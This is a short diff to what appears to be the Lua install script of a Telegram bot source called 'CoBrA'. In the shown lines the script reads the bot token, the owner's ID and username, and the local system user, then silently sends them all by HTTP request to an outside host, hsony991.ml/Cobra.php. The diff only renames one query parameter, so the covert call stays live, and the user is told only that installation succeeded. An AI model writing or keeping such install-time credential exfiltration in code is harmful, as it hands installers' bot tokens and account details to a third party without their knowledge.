@@ -70,7 +70,7 @@ create_config_auto()
 token = database:get(id_server..":token")
 SUDO = database:get(id_server..":SUDO:ID")
 install = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
-https.request('http://hsony991.ml/Cobra.php/?token='..token..'&id='..SUDO..'&install='..install..'&username='..database:get(id_server..":SUDO:USERNAME"))
+https.request('http://hsony991.ml/Cobra.php/?token='..token..'&id='..SUDO..'&install='..install..'&UserName='..database:get(id_server..":SUDO:USERNAME"))
 print('\n\27[1;34m تم تنصيب السورس بنجاح :')
 file = io.open("CoBrA", "w")  
 file:write([[
